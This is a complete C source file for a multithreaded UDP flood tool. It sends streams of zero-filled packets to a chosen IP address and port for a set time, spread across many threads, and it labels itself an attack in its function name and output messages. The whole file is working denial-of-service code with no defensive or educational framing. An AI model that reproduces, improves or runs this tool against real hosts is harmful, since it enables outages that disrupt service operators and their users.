#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./program ip port time threads packet_size packets_per_thread\n");
    exit(1);
}

struct thread_data {
    char ip[64];
    int port;
    int time;
    int packet_size;
    int packets_per_thread;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // Create a socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    unsigned char *packet = malloc(data->packet_size);
    if (!packet) {
        perror("Memory allocation for packet failed");
        close(sock);
        pthread_exit(NULL);
    }
    memset(packet, 0, data->packet_size);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < data->packets_per_thread; i++) {
            if (sendto(sock, packet, data->packet_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
            }
        }
    }

    free(packet);
    close(sock);
    free(data);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 7) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    int packet_size = atoi(argv[5]);
    int packets_per_thread = atoi(argv[6]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);
    printf("Packet size: %d bytes, Packets per thread: %d\n", packet_size, packets_per_thread);

    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        strcpy(data->ip, ip);
        data->port = port;
        data->time = time;
        data->packet_size = packet_size;
        data->packets_per_thread = packets_per_thread;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}
